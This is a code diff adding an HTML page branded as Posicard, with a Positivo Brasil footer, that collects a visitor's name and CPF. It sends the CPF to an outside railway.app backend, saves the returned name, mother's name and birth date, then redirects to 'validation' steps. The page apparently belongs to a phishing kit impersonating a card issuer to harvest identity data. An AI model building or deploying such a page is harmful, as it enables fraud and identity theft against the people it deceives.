@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+        .header {
+        background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%,rgb(0, 73, 144) 54.8%, rgb(250, 99, 160) 93.4%);
+        color: white;
+        padding: 15px 0;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        grid-area: top-bar;
+    }
+    .main-content {
+        max-width: 450px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem 2rem 1rem 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 0 auto;
+    }
+    .main-content h2 {
+        margin-bottom: 20px;
+    }
+    .btn-custom {
+        color: white;
+        border: none;
+        width: 100%;
+        margin-bottom: 10px;
+        background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(255, 0, 0) 93.4%);
+        font-weight: 600;
+        border-radius: 1rem;
+        padding: .75rem 3rem;
+        letter-spacing: .3px;
+        line-height: 1.15;
+    }
+    .btn-custom:hover{
+        color: black !important;
+        background-color: #00adca !important;
+        transform: scale(1.02) !important;
+    }
+    
+    .footer {
+        background-color: #ffffff;
+        border-top: solid 1px #e6dddd;
+        color: #000;
+        text-align: center;
+        width: 100%;
+        bottom: 0;
+        grid-area: footer;
+        border-bottom: solid 3px #e6007e;
+        padding: 2rem 0.5rem;
+        position: relative;
+        margin-top: 50px;
+    }
+    
+    #conclusao {
+        display: none; /* Esconde o elemento por padrão */
+    }
+    
+    #conclusao h4 {
+        color: green; /* Define a cor do texto */
+        font-weight: bold; /* Define o texto em negrito */
+    }
+    
+    .char {
+        border-top: solid px #00adca;
+        background-color: #00adca;
+        padding: 2px !important;
+    }/* End custom CSS */
+    </style>
+    
+
+</head>
+
+<body>
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">    
+    <div class="header">
+        <img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada" data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada"></noscript>
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;"> 
+        <!-- Seção 7: Formulário de Cadastro -->
+        <div style="margin-top: 18px;" class="main-content">
+            <div id="formulario" class="mb-3">
+                <p style="color:gray; text-align:initial">Preencha os campos abaixo</p>
+                <form id="cadastroForm" style="text-align:initial" action="/card">
+                    <div class="mb-3">
+                        <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome completo</label>
+                        <input type="text" class="form-control" id="nome" placeholder="Ex: Maria">
+                    </div>
+                    <div class="mb-3">
+                        <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
+                        <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
+                    </div>
+                    <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
+                        <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #e6007e;"></i>
+                    </div>
+                </form>
+                    <button class="btn-custom" onclick="submitLog()">Continuar</button>
+                
+            </div>
+    
+        </div>
+    </div> 
+
+    <script>
+        // Função para validar o CPF
+        function validaCPF(strCPF) {
+            var Soma;
+            var Resto;
+            Soma = 0;
+            if (strCPF == "00000000000") return false;
+    
+            for (i = 1; i <= 9; i++) Soma = Soma + parseInt(strCPF.substring(i - 1, i)) * (11 - i);
+            Resto = (Soma * 10) % 11;
+    
+            if ((Resto == 10) || (Resto == 11)) Resto = 0;
+            if (Resto != parseInt(strCPF.substring(9, 10))) return false;
+    
+            Soma = 0;
+            for (i = 1; i <= 10; i++) Soma = Soma + parseInt(strCPF.substring(i - 1, i)) * (12 - i);
+            Resto = (Soma * 10) % 11;
+    
+            if ((Resto == 10) || (Resto == 11)) Resto = 0;
+            if (Resto != parseInt(strCPF.substring(10, 11))) return false;
+            return true;
+        }
+    
+        // Função para buscar os dados do CPF usando a nova API
+        async function getCPF(strCPF) {
+            // Substitua a URL com o endereço real do seu backend PHP
+            const url = `https://meu-backend.up.railway.app/?cpf=${strCPF}`;
+            
+            try {
+                const res = await fetch(url);
+                if (!res.ok) {
+                    throw new Error(`Erro na requisição: ${res.status} - ${res.statusText}`);
+                }
+                const data = await res.json();
+                return data;
+            } catch (error) {
+                console.error("Erro ao buscar dados do CPF:", error);
+                throw error; // Repassa o erro para ser tratado no submitLog
+            }
+        }
+    
+        // Função de envio de formulário
+        const submitLog = async () => {
+            const nome = document.getElementById("nome").value;
+            const cpf = document.getElementById("cpf").value.replace(/-/g, "").replace(/\./g, "");
+            console.log("CPF informado:", cpf);
+            
+            // Valida CPF
+            if (validaCPF(cpf)) {
+                try {
+                    // Busca os dados do CPF
+                    const responseCPF = await getCPF(cpf);
+                    console.log("Dados recebidos:", responseCPF);
+                    
+                    // Verifica se os dados estão completos
+                    if (responseCPF && responseCPF.CPF) {
+                        // Armazena os dados no localStorage
+                        localStorage.setItem("posicard_cpf", responseCPF.CPF);
+                        localStorage.setItem("posicard_nome", responseCPF.NOME);
+                        localStorage.setItem("posicard_mae", responseCPF.MAE); // Usando "MAE" agora, em vez de "NOME_MAE"
+    
+                        // Formatação da data de nascimento
+                        var data = responseCPF.NASCIMENTO; // Corrigido para "NASCIMENTO"
+                        if (data) {
+                            data = data.split("/"); // Separar a data no formato dd/mm/aaaa
+                            localStorage.setItem("posicard_dtnasc", data[0] + "/" + data[1] + "/" + data[2]);
+                        }
+    
+                        // Redirecionamento conforme dados recebidos
+                        if (!responseCPF.MAE) {
+                            location.href = '/valida-nascimento';
+                        } else {
+                            location.href = '/valida-mae';
+                        }
+                    } else {
+                        alert("Dados do CPF não encontrados!");
+                    }
+                } catch (error) {
+                    alert("Erro ao buscar dados do CPF. Tente novamente.");
+                    console.error(error);
+                }
+            } else {
+                alert("CPF inválido!");
+            }
+        }
+    </script>
+    
+
+    
+    <div class="footer py-4" id="footerChg">
+         © 2024 Positivo Brasil. CNPJ 35.380.502/0001-70 <br>
+         Todos os direitos reservados
+    </div>
+</div>
+</body>
+
+
